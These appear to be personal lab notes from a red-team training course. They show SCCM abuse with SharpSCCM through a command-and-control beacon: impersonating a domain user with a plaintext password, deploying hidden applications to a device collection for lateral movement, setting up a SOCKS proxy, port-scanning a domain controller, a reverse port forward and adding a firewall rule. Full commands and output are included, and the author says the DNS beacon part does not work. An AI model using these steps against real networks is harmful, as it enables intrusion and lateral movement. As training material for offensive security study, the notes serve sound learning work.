With Full or Application Administrator privileges over a device or a collection, we can deploy scripts or applications to aid in lateral movement.  To execute a command on every device in the DEV collection, we could do `exec -n DEV -p <path>`.

in order to be able to execute in the `DEV` group you must have a user that is in that group, in this case we must `impersonate` `DEV\jking`
`make_token DEV\jking Qwerty1234`
```powershell
beacon> make_token DEV\jking Qwerty123
[*] Tasked beacon to create a token for DEV\jking
[+] host called home, sent: 37 bytes
[+] Impersonated DEV\jking (netonly)
```
took a while to complete `[+] Completed execution in 00:02:08.8028395`
```powershell
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
[+] host called home, sent: 1233246 bytes
[+] received output:

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[+] received output:
[+] Creating new application: Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab
[+] Application path: C:\Windows\notepad.exe
[+] Updated application to hide it from the Configuration Manager console
[+] Updated application to run in the context of the logged on user

[+] received output:
[+] Successfully created application

[+] received output:
[+] Creating new deployment of Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab to DEV (S0100014)

[+] received output:
[+] Found the Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab application

[+] received output:
[+] Successfully created deployment of Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab to DEV (S0100014)
[+] New deployment name: Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab_S0100014_Install
[+] Waiting for new deployment to become available...

[+] received output:
[+] New deployment is available, waiting 30 seconds for updated policy to become available

[+] received output:
[+] Forcing all members of DEV (S0100014) to retrieve machine policy and execute any new applications available

[+] received output:
[+] Waiting 1 minute for execution to complete...

[+] received output:
[+] Cleaning up

[+] received output:
[+] Found the Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab_S0100014_Install deployment

[+] received output:
[+] Deleted the Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab_S0100014_Install deployment
[+] Querying for deployments of Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab_S0100014_Install
[+] No remaining deployments named Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab_S0100014_Install were found

[+] received output:
[+] Found the Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab application

[+] received output:
[+] Deleted the Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab application
[+] Querying for applications named Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab

[+] received output:
[+] No remaining applications named Application_8d5eaab7-df9c-4756-8bee-a7104a4a03ab were found
[+] Completed execution in 00:02:08.8028395
```
SharpSCCM attempts to hide the application (i.e. the command we're executing) from the GUI, but the deployment is still visible until it completes.
![[Pasted image 20231218174759.png]]


# need to figure out my proxy/rportfwds from attacker dekstop -> wkstn-2 -> dc-2 to have my dns beacon back through
this didnt work.
the dns beacon is working because i got a beacon on my own attack dekstop.
```powershell
[12/18 22:57:14] beacon> socks 1080 SOCKS5 enableNoAuth "" "" disableLogging
[12/18 22:57:14] [+] started SOCKS5 server on: 1080
[12/18 22:58:06] beacon> portscan 10.10.122.10
[12/18 22:58:07] [*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 10.10.122.10
[12/18 22:58:07] [+] host called home, sent: 95030 bytes
[12/18 22:58:08] [+] received output:
(ICMP) Target '10.10.122.10' is alive. [read 8 bytes]

[12/18 22:58:09] [+] received output:
10.10.122.10:5985

[12/18 22:58:11] [+] received output:
10.10.122.10:3389

[12/18 22:58:17] [+] received output:
10.10.122.10:636

[12/18 22:58:18] [+] received output:
10.10.122.10:593

[12/18 22:58:20] [+] received output:
10.10.122.10:464
10.10.122.10:443

[12/18 22:58:21] [+] received output:
10.10.122.10:389

[12/18 22:58:25] [+] received output:
10.10.122.10:139

[12/18 22:58:26] [+] received output:
10.10.122.10:135

[12/18 22:58:30] [+] received output:
10.10.122.10:88
10.10.122.10:53

[12/18 22:58:41] [+] received output:
10.10.122.10:445 (platform: 500 version: 10.0 name: DC-2 domain: DEV)
Scanner module is complete

[12/18 23:02:29] beacon> rportfwd 53 127.0.0.1 53
[12/18 23:02:29] [+] started reverse port forward on 53 to 127.0.0.1:53
[12/18 23:02:29] [*] Tasked beacon to forward port 53 to 127.0.0.1:53
[12/18 23:02:29] [+] host called home, sent: 10 bytes
[12/18 23:02:51] beacon> powershell New-NetFirewallRule -DisplayName "53-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 53
[12/18 23:02:51] [*] Tasked beacon to run: New-NetFirewallRule -DisplayName "53-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 53
[12/18 23:02:51] [+] host called home, sent: 335 bytes
[12/18 23:02:57] [+] received output:
#< CLIXML


Name                          : {e650855f-2089-4135-b7aa-c3a33e131a25}
DisplayName                   : 53-In
Description                   : 
DisplayGroup                  : 
Group                         : 
Enabled                       : True
Profile                       : Any
Platform                      : {}
Direction                     : Inbound
Action                        : Allow
EdgeTraversalPolicy           : Block
LooseSourceMapping            : False
LocalOnlyMapping              : False
Owner                         : 
PrimaryStatus                 : OK
Status                        : The rule was parsed successfully from the store. (65536)
EnforcementStatus             : NotApplicable
PolicyStoreSource             : PersistentStore
PolicyStoreSourceType         : Local
RemoteDynamicKeywordAddresses : 


```

This doesn't work for me, i've noticed that it is probably due to something being wrong with my DNS beacons, im not completely sure. Going to have to come back to all the `broken` sections